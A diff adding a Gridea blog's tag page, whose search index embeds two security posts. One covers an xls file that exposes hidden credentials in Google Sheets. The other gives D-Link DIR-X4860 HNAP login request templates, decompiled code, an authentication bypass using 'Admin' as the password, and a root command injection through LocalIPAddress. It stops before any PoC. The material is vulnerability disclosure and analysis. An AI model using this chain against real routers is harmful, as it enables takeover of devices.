@@ -1,0 +1,1416 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+<meta name="google-site-verification" content="80YRlOIiJ6gtjDTf3tccBO5KT2oVxjd2JyZizeIcB6w" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="keywords" content="Gridea静态个人博客">
+<meta name="description" content="此处有崇山峻岭，茂林修竹">
+<meta name="theme-color" content="#000">
+<title>AegeanYan的小酒馆</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1717512228505">
+<link rel="stylesheet" href="/media/css/pisces.css">
+<link rel="stylesheet" href="/media/fonts/font-awesome.css">
+<link
+  href="//fonts.loli.net/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
+  rel="stylesheet" type="text/css">
+
+<link href="/media/hljs/styles/default.css"
+  rel="stylesheet">
+
+<link rel="stylesheet" href="/styles/main.css">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script src="/media/js/jquery.js"></script>
+<script src="/media/hljs/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
+  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
+  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
+  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+  onload="renderMathInElement(document.body);"></script>
+
+
+
+
+
+
+</head>
+
+<body>
+  <div class="head-top-line"></div>
+  <div class="header-box">
+    
+<div class="pisces">
+  <header class="header  ">
+    <div class="blog-header box-shadow-wrapper bg-color " id="header">
+      <div class="nav-toggle" id="nav_toggle">
+        <div class="toggle-box">
+          <div class="line line-top"></div>
+          <div class="line line-center"></div>
+          <div class="line line-bottom"></div>
+        </div>
+      </div>
+      <div class="site-meta">       
+        <div class="site-title">
+          
+            <a href="/" class="brand">
+              <span>AegeanYan的小酒馆</span>
+            </a>  
+          
+        </div>
+        
+          <p class="subtitle">精于心，简于形</p>
+        
+      </div>
+      <nav class="site-nav" id="site_nav">
+        <ul id="nav_ul">
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/" target="_self">
+                  <i class="fa fa-globe"></i> 首页
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/archives" target="_self">
+                  <i class="fa fa-globe"></i> 归档
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/tags" target="_self">
+                  <i class="fa fa-globe"></i> 标签
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/post/about" target="_self">
+                  <i class="fa fa-globe"></i> 关于
+                </a>
+              
+            </li>
+          
+          
+            
+              <li class="nav-item ">
+                <a href="/friends/" target="_self">
+                  
+                    <i class="fa fa-address-book"></i> 友链
+                  
+                </a>
+              </li>
+            
+          
+          
+            <li id="fa_search" class="nav-item">
+              <a href="javascript:void(0);">
+                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </header>
+</div>
+
+<script type="text/javascript"> 
+ 
+  let showNav = true;
+
+  let navToggle = document.querySelector('#nav_toggle'),
+  siteNav = document.querySelector('#site_nav');
+  
+  function navClick() {
+    let sideBar = document.querySelector('.sidebar');
+    let navUl = document.querySelector('#nav_ul');
+    navToggle.classList.toggle('nav-toggle-active');
+    siteNav.classList.toggle('nav-menu-active');
+    if (siteNav.classList.contains('nav-menu-active')) {
+      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
+    } else {
+      siteNav.style = "";
+    }
+  }
+
+  navToggle.addEventListener('click',navClick);  
+</script>
+  </div>
+  <div class="main-continer">
+    
+    <div
+      class="section-layout  pisces">
+      <div class="section-layout-wrapper">
+        <div id="sidebarMeta" class="sidebar">
+    
+<div class="sidebar-wrapper box-shadow-wrapper bg-color">
+  <div class="sidebar-item">
+    <img class="site-author-image right-motion" src="/images/avatar.png"/>
+    <p class="site-author-name">AegeanYan的安全笔记</p>
+    
+  </div>
+  <div class="sidebar-item side-item-stat right-motion">
+    <div class="sidebar-item-box">
+      <a href="/archives/">
+        
+        <span class="site-item-stat-count">8</span>
+        <span class="site-item-stat-name language" data-lan="article">文章</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="/tags/">
+        <span class="site-item-stat-count">1</span>
+        <span class="site-item-stat-name language" data-lan="tag">标签</span>
+      </a>
+    </div>
+  </div>
+  
+    
+  
+  
+
+
+
+</div>
+</div>
+<script>
+  let sidebarMeta = document.querySelector('#sidebarMeta');
+  let scheme = 'pisces';
+  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
+  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
+    document.addEventListener('scroll', function(e) {
+      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
+        sidebarWrapper.classList.add('home-sidebar-fixed')
+      } else {
+        sidebarWrapper.classList.remove('home-sidebar-fixed')
+      }
+    });
+  }
+  </script>
+        <div class="section-box tag-line box-shadow-wrapper">
+          <section class="section tags-section posts-expand bg-color">
+            <div class="padding-wrapper">
+  <div class="tag-timeline-box">
+    <div class="tag-timeline-wrapper">
+      <div class="tag-timeline-title">
+        <h2>
+          Gridea
+          <small class="language" data-lan="tag">标签</small>
+        </h2>
+      </div>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      <a href="https://AegeanYan.github.io/post/hello-gridea/">
+        <div class="motion-warpper">
+          <div class="tag-post-node">
+            <h1>
+              12-12
+              <small>Hello Gridea</small>
+            </h1>
+          </div>
+        </div>
+      </a>
+      
+      
+      
+    </div>
+  </div>
+</div>
+          </section>
+        </div>
+      </div>
+    </div>
+    <div class="footer-box">
+  <footer class="footer">
+    <center id="runTimeBox">
+      已运行:<span id="run_time"></span>
+    </center>
+    <span id="busuanzi_container_site_pv">浏览数:<span id="busuanzi_value_site_pv"></span> 次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">访客数:<span id="busuanzi_value_site_uv"></span> 人</span>
+
+    <script>
+      BirthDay = new Date('');
+      if (BirthDay.getTime()) {
+        function runTime() {
+          str = "";
+          today = new Date();
+          timeold = today.getTime() - BirthDay.getTime();
+          msPerDay = 24 * 60 * 60 * 1000;
+          e_daysold = timeold / msPerDay;
+          daysold = Math.floor(e_daysold);
+          str += daysold + "天";
+          return str;
+        }
+        setInterval(function () {
+          $("#run_time").html(runTime());
+        }, 1000);
+      } else {
+        document.querySelector('.footer').removeChild(document.querySelector('#runTimeBox'));
+      }
+    </script>
+    <div class="poweredby">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+  </footer>
+  
+    
+        <div class="pisces back-to-top" id="back_to_top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span class="scrollpercent"> <span id="back_to_top_text">0</span>% </span>
+            
+        </div>
+        
+                  
+                        
+</div>
+<script>
+  let sideBarOpen = "sidebar-open";
+  let body = document.body;
+  let back2Top = document.querySelector("#back_to_top"),
+    back2TopText = document.querySelector("#back_to_top_text"),
+    drawerBox = document.querySelector("#drawer_box"),
+    rightSideBar = document.querySelector(".sidebar"),
+    viewport = document.querySelector("body");
+
+  function scrollAnimation(currentY, targetY) {
+    let needScrollTop = targetY - currentY;
+    let _currentY = currentY;
+    setTimeout(() => {
+      const dist = Math.ceil(needScrollTop / 10);
+      _currentY += dist;
+      window.scrollTo(_currentY, currentY);
+      if (needScrollTop > 10 || needScrollTop < -10) {
+        scrollAnimation(_currentY, targetY);
+      } else {
+        window.scrollTo(_currentY, targetY);
+      }
+    }, 1);
+  }
+
+  back2Top.addEventListener("click", function (e) {
+    scrollAnimation(document.scrollingElement.scrollTop, 0);
+    e.stopPropagation();
+    return false;
+  });
+
+  window.addEventListener("scroll", function (e) {
+    let percent =
+      (document.scrollingElement.scrollTop /
+        (document.scrollingElement.scrollHeight -
+          document.scrollingElement.clientHeight)) *
+      100;
+    if (percent > 1 && !back2Top.classList.contains("back-top-active")) {
+      back2Top.classList.add("back-top-active");
+    }
+    if (percent == 0) {
+      back2Top.classList.remove("back-top-active");
+    }
+    if (back2TopText) {
+      back2TopText.textContent = Math.floor(percent);
+    }
+  });
+
+  let hasCacu = false;
+  window.addEventListener("resize", function (e) {
+    calcuHeight();
+  });
+
+  function calcuHeight() {
+    // 动态调整站点概览高度
+    if (
+      (!hasCacu && back2Top.classList.contains("pisces")) ||
+      back2Top.classList.contains("gemini")
+    ) {
+      let sideBar = document.querySelector(".sidebar");
+      let navUl = document.querySelector("#site_nav");
+      sideBar.style =
+        "margin-top:" + (navUl.offsetHeight + navUl.offsetTop + 15) + "px;";
+      hasCacu = true;
+    }
+  }
+  calcuHeight();
+
+  let open = false,
+    MOTION_TIME = 300,
+    RIGHT_MOVE_DIS = "320px";
+
+  if (drawerBox) {
+    let rightMotions = document.querySelectorAll(".right-motion");
+    let right = drawerBox.classList.contains("right");
+
+    let transitionDir = right
+      ? "transition.slideRightIn"
+      : "transition.slideLeftIn";
+
+    let openProp, closeProp;
+    if (right) {
+      openProp = {
+        paddingRight: RIGHT_MOVE_DIS,
+      };
+      closeProp = {
+        paddingRight: "0px",
+      };
+    } else {
+      openProp = {
+        paddingLeft: RIGHT_MOVE_DIS,
+      };
+      closeProp = {
+        paddingLeft: "0px",
+      };
+    }
+
+    drawerBox.onclick = function () {
+      open = !open;
+      jQuery.Velocity(rightSideBar, "stop");
+      jQuery.Velocity(viewport, "stop");
+      jQuery.Velocity(rightMotions, "stop");
+      if (open) {
+        jQuery.Velocity(
+          rightSideBar,
+          {
+            width: RIGHT_MOVE_DIS,
+          },
+          {
+            duration: MOTION_TIME,
+            begin: function () {
+              jQuery.Velocity(rightMotions, transitionDir, {});
+            },
+          }
+        );
+        jQuery.Velocity(viewport, openProp, {
+          duration: MOTION_TIME,
+        });
+      } else {
+        jQuery.Velocity(
+          rightSideBar,
+          {
+            width: "0px",
+          },
+          {
+            duration: MOTION_TIME,
+            begin: function () {
+              jQuery.Velocity(rightMotions, {
+                opacity: 0,
+              });
+            },
+          }
+        );
+        jQuery.Velocity(viewport, closeProp, {
+          duration: MOTION_TIME,
+        });
+      }
+      for (let i = 0; i < drawerBox.children.length; i++) {
+        drawerBox.children[i].classList.toggle("muse-line");
+      }
+      drawerBox.classList.toggle(sideBarOpen);
+    };
+  }
+
+  // 链接跳转
+  let newWindow = "false";
+  if (newWindow === "true") {
+    let links = document.querySelectorAll(".post-body a");
+    links.forEach((item) => {
+      if (!item.classList.contains("btn")) {
+        item.setAttribute("target", "_blank");
+      }
+    });
+  }
+
+  let faSearch = document.querySelector("#fa_search");
+  faSearch &&
+    faSearch.addEventListener("click", function () {
+      document.querySelector("#search_mask").style = "";
+    });
+
+  // 代码高亮
+  hljs.initHighlightingOnLoad();
+
+  // 离开当前页title变化
+  var leaveTitle = "";
+  var normal_title = document.title;
+  if (leaveTitle) {
+    document.addEventListener("visibilitychange", function () {
+      if (document.visibilityState == "hidden") {
+        normal_title = document.title;
+        document.title = leaveTitle;
+      } else {
+        document.title = normal_title;
+      }
+    });
+  }
+</script>
+
+<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
+<script src="/media/js/jquery.fancybox.js"></script>
+
+<script>
+  let images = document.querySelectorAll(".section img");
+  images.forEach((image) => {
+    var parent = image.parentElement;
+    var next = image.nextElementSibling;
+    parent.removeChild(image);
+    var aelem = document.createElement("a");
+    aelem.href = image.src;
+    aelem.dataset["fancybox"] = "images";
+    aelem.dataset["rel"] = "fancybox-button";
+    aelem.classList.add("fancybox");
+    aelem.appendChild(image);
+    parent.insertBefore(aelem, next);
+  });
+</script>
+  </div>
+</body>
+
+  <div class="search-mask" id="search_mask" style="display: none;">
+  <div class="search-box">
+    <div class="search-title">
+      <i class="fa fa-search"></i>
+      <div class="input-box">
+        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
+      </div>
+      <i id="close" class="fa fa-times-circle"></i>
+    </div>
+    <div class="stat-box">
+      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
+      <hr>
+    </div>
+    <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/google-sheet-da-kai-kong-bai-xls/"" data-c="
+          &lt;blockquote&gt;
+&lt;p&gt;通过将某空白xls格式的加密凭证用Google sheet打开，取得了意想不到的破解效果，推测是xls上某种弱加密方式受到了软件兼容问题。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;作者在Bugcrowd悬赏的目标网站上寻找漏洞时发现了一个名为&lt;code&gt;redacted.xls&lt;/code&gt; 的可疑文件，正常打开是一片空白，使用电子取证技术结果如下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042224911.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;该文件Security项标为Password protected，但实际打开时没有输入密码&lt;/li&gt;
+&lt;li&gt;文件大小约为16KB，但看上去是空的，元数据理应只占1-2KB&lt;/li&gt;
+&lt;li&gt;使用OLE及其他工具提取数据一无所获&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;奇怪的是，使用Excel和LibreOffice打开该xls文件时出现了异常现象: Excel中的显示从J列开始，而LibreOffice中从L列开始：某些表格类数据确实被隐藏了。&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042230121.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;然而，当用Google Sheet打开它时，意外的是可以展开J列了&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042232404.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;隐藏信息包含了大量的“企业详细信息”、“用户ID和密码”、“登录页面地址”等。&lt;/p&gt;
+&lt;h6 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h6&gt;
+&lt;p&gt;该文件采取了某种过时的空白加密方式以至于市面上的取证方法无法识别，但由于兼容性问题，在Google Sheet中将其显示出来。&lt;/p&gt;
+">Google sheet打开空白xls</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/dir-x4860_d-link-lu-you-qi-0day-lou-dong/"" data-c="
+          &lt;blockquote&gt;
+&lt;p&gt;D-Link是一家台湾企业，主要产品是交换机、路由器等网络产品，但其产品曝出多个安全漏洞，仅2024.4其NAS产品就曝出了CVE-2024-3272、CVE-2024-3273漏洞。且D-Link对待这些漏洞比较消极。&lt;/p&gt;
+&lt;p&gt;DIR-X4860 中的安全漏洞允许未经身份验证的远程攻击者访问 HNAP 端口以获得提升的权限，并以&lt;code&gt;root&lt;/code&gt;身份执行指令。通过将身份验证绕过与命令执行相结合，设备可能会被完全破坏。该漏洞尚未被重视。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;发现者：&lt;/strong&gt; SSD Secure Disclosure的安全研究人员&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;供应商回应：&lt;/strong&gt; 过去一个月中他们已联系供应商3次，但未收到回应。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;受影响版本：&lt;/strong&gt; 运行&lt;code&gt;DIRX4860A1_FWV1.04B03&lt;/code&gt;固件的DIR-x4860&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞成因：&lt;/strong&gt; 固件在HNAP协议上对身份验证算法实施的不正确&lt;/p&gt;
+&lt;h6 id=&#34;hnap协议&#34;&gt;HNAP协议&lt;/h6&gt;
+&lt;p&gt;**Step 1:**发送login请求并等待响应&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Headers:
+&amp;quot;Content-Type&amp;quot;: &amp;quot;text/xml; charset=utf-8&amp;quot;
+&amp;quot;SOAPAction&amp;quot;: &amp;quot;http://purenetworks.com/HNAP1/Login&amp;quot;
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+  &amp;lt;soap:Body&amp;gt;
+    &amp;lt;Login xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+      &amp;lt;Action&amp;gt;request&amp;lt;/Action&amp;gt;
+      &amp;lt;Username&amp;gt;Admin&amp;lt;/Username&amp;gt; //Admin是默认管理员账户
+      &amp;lt;LoginPassword/&amp;gt;
+      &amp;lt;Captcha/&amp;gt;
+    &amp;lt;/Login&amp;gt;
+  &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;响应数据&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+  &amp;lt;soap:Body&amp;gt;
+    &amp;lt;LoginResponse xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+      &amp;lt;LoginResult&amp;gt;OK&amp;lt;/LoginResult&amp;gt;
+      &amp;lt;Challenge&amp;gt;........&amp;lt;/Challenge&amp;gt;
+      &amp;lt;Cookie&amp;gt;........&amp;lt;/Cookie&amp;gt;
+      &amp;lt;PublicKey&amp;gt;........&amp;lt;/PublicKey&amp;gt;
+    &amp;lt;/LoginResponse&amp;gt;
+  &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cookie项用于填充后续所有HTTP请求，Challenge和PublicKey用于计算HNAP_AUTH作为HTTP包头的身份验证&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pseudocode&#34;&gt;LoginPassword:
+PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
+LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
+uid :
+uid = Cookie
+HNAP_AUTH:
+    SOAP_NAMESPACE2 = &amp;quot;http://purenetworks.com/HNAP1/&amp;quot;
+    Action = &amp;quot;Login&amp;quot;
+    SOAPAction = &#39;&amp;quot;&#39; + SOAP_NAMESPACE2 + Action + &#39;&amp;quot;&#39;
+    Time = int(round(time.time() * 1000))
+    Time = math.floor(Time) % 2000000000000
+    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;**Step 2:**发送正式login并等待响应&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;Headers:
+&amp;quot;Content-Type&amp;quot;: &amp;quot;text/xml; charset=utf-8&amp;quot;
+&amp;quot;SOAPAction&amp;quot;: &amp;quot;http://purenetworks.com/HNAP1/Login&amp;quot;
+&amp;quot;HNAP_AUTH&amp;quot;: &amp;quot;........&amp;quot;
+&amp;quot;Cookie&amp;quot;: &amp;quot;uid=........&amp;quot; //默认填充
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+  &amp;lt;soap:Body&amp;gt;
+    &amp;lt;Login xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+      &amp;lt;Action&amp;gt;login&amp;lt;/Action&amp;gt;
+      &amp;lt;Username&amp;gt;Admin&amp;lt;/Username&amp;gt;
+      &amp;lt;LoginPassword&amp;gt;........&amp;lt;/LoginPassword&amp;gt;
+      &amp;lt;Captcha/&amp;gt;
+    &amp;lt;/Login&amp;gt;
+  &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;响应数据&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+  &amp;lt;soap:Body&amp;gt;
+    &amp;lt;LoginResponse xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+      &amp;lt;LoginResult&amp;gt;success&amp;lt;/LoginResult&amp;gt;//success代表成功
+    &amp;lt;/LoginResponse&amp;gt;
+  &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6 id=&#34;身份漏洞&#34;&gt;身份漏洞&lt;/h6&gt;
+&lt;p&gt;在&lt;code&gt;/bin/prog.cgi&lt;/code&gt;文件中发现漏洞&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __fastcall sub_5394C(int a1, int a2, int a3, int a4)
+{
+  int v5; // r1
+  char *v6; // r0
+  const char *v7; // r5
+  const char *v8; // r5
+  int v10; // r0
+  int v11; // r1
+  int v12; // r2
+  int v13; // r3
+  sub_53074(a1, a2, a3, a4);
+  if ( sub_51038(a1) )
+  {
+    v6 = GetHNAPParam(a1, &amp;quot;/Login/Action&amp;quot;);
+    v7 = v6;
+    if ( v6 )
+    {
+      if ( !strncmp(v6, &amp;quot;request&amp;quot;, 7u) )
+      {
+        handle_login_request(a1); // into here !!!
+        return 1;
+      }
+      ******
+}
+int __fastcall handle_login_request(int a1)
+{
+  char *Username; // r11
+  int v3; // r5
+  int result; // r0
+  const char *PrivateLogin; // [sp+Ch] [bp-84h]
+  char s[64]; // [sp+10h] [bp-80h] BYREF
+  char v7[64]; // [sp+50h] [bp-40h] BYREF
+  char v8[64]; // [sp+90h] [bp+0h] BYREF
+  char http_password[64]; // [sp+D0h] [bp+40h] BYREF
+  char v10[128]; // [sp+110h] [bp+80h] BYREF
+  memset(s, 0, sizeof(s));
+  memset(v7, 0, sizeof(v7));
+  memset(v8, 0, sizeof(v8));
+  memset(http_password, 0, sizeof(http_password));
+  memset(v10, 0, sizeof(v10));
+  if ( sub_51FE4(a1) )
+  {
+    sub_5322C(a1, 5);
+    result = 0;
+  }
+  else
+  {
+    GetHNAPParam(a1, &amp;quot;/Login/Action&amp;quot;);
+    Username = GetHNAPParam(a1, &amp;quot;/Login/Username&amp;quot;);
+    GetHNAPParam(a1, &amp;quot;/Login/LoginPassword&amp;quot;);
+    GetHNAPParam(a1, &amp;quot;/Login/Captcha&amp;quot;);
+    PrivateLogin = GetHNAPParam(a1, &amp;quot;/Login/PrivateLogin&amp;quot;);
+    sub_50F98(s, 20);
+    sub_50F98(v7, 10);
+    sub_50F98(v8, 20);
+    if ( PrivateLogin &amp;amp;&amp;amp; !strncmp(PrivateLogin, &amp;quot;Username&amp;quot;, 8u) )
+      strncpy(http_password, Username, 0x40u); // Authentication Bypass!!
+    else
+      get_http_password(http_password, 0x40u);
+    sub_51284(s, http_password, v8, v10, 128);
+    v3 = sub_51468(a1, v10, s, v7, v8);
+    sub_51094(a1, v7);
+    sub_5322C(a1, 0);
+    result = v3;
+  }
+  return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果包含&amp;quot;PrivateLogin&amp;quot;关键词且与&amp;quot;Username&amp;quot;相同，就会直接将用户名作为密钥验证&lt;/p&gt;
+&lt;p&gt;这里我们用&amp;quot;Admin&amp;quot;作为密码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pseudocode&#34;&gt;LoginPassword:
+password = ”Admin&amp;quot;
+PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
+LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
+uid :
+uid = Cookie
+HNAP_AUTH:
+    SOAP_NAMESPACE2 = &amp;quot;http://purenetworks.com/HNAP1/&amp;quot;
+    Action = &amp;quot;Login&amp;quot;
+    SOAPAction = &#39;&amp;quot;&#39; + SOAP_NAMESPACE2 + Action + &#39;&amp;quot;&#39;
+    Time = int(round(time.time() * 1000))
+    Time = math.floor(Time) % 2000000000000
+    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6 id=&#34;利用链&#34;&gt;利用链：&lt;/h6&gt;
+&lt;p&gt;&lt;em&gt;D-Link DIR-X4860 SetVirtualServerSettings LocalIPAddress Command Injection Remote Code Execution&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/bin/prog.cgi&lt;/code&gt;中的函数&lt;code&gt;SetVirtualServerSettings&lt;/code&gt;存在漏洞&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void __fastcall SetVirtualServerSettings(int a1)
+{
+      ******
+      log_log(7, &amp;quot;SetVirtualServerSettings&amp;quot;, 599, &amp;quot;pProtocolNumber=%s\n&amp;quot;, v19);
+      snprintf(v20, 0x100u, &amp;quot;/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s&amp;quot;, v3, &amp;quot;LocalIPAddress&amp;quot;);
+      LocalIPAddress_v16 = GetHNAPParam(a1, v20);
+      if ( !LocalIPAddress_v16 )
+      {
+        v5 = 604;
+        goto LABEL_9;
+      }
+      log_log(7, &amp;quot;SetVirtualServerSettings&amp;quot;, 606, &amp;quot;pLocalIPAddress=%s\n&amp;quot;, LocalIPAddress_v16);
+      snprintf(v20, 0x100u, &amp;quot;/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s&amp;quot;, v3, &amp;quot;ScheduleName&amp;quot;);
+      v8 = GetHNAPParam(a1, v20);
+      if ( !v8 )
+      {
+        v5 = 611;
+        goto LABEL_9;
+      }
+      if ( !strcmp(s1, &amp;quot;true&amp;quot;)
+        &amp;amp;&amp;amp; !strcmp(v13, &amp;quot;9&amp;quot;)
+        &amp;amp;&amp;amp; !strcmp(v7, &amp;quot;UDP&amp;quot;)
+        &amp;amp;&amp;amp; FCGI_popen_v1(LocalIPAddress_v16, v13, v7, s, ++v14) == -1 ) // into here !!!
+      {
+        v5 = 620;
+        goto LABEL_9;
+      }
+      ******
+}
+int __fastcall FCGI_popen_v1(const char *LocalIPAddress, int a2, int a3, char *a4, int a5)
+{
+  int v7; // r0
+  int v8; // r6
+  char v10[20]; // [sp+Ch] [bp-14h] BYREF
+  char v11[64]; // [sp+20h] [bp+0h] BYREF
+  char v12[68]; // [sp+60h] [bp+40h] BYREF
+  memset(v11, 0, sizeof(v11));
+  memset(v10, 0, 0x12u);
+  memset(v12, 0, 0x40u);
+  snprintf(v12, 0x40u, &amp;quot;arp | grep %s | awk &#39;{printf $4}&#39;&amp;quot;, LocalIPAddress);
+  v7 = FCGI_popen(v12, &amp;quot;r&amp;quot;); // rce !!!
+  ******
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过篡改&lt;code&gt;LocalIPAddress&lt;/code&gt;即可在root上下文执行命令&lt;/p&gt;
+&lt;h6 id=&#34;part-of-poc&#34;&gt;Part of PoC&lt;/h6&gt;
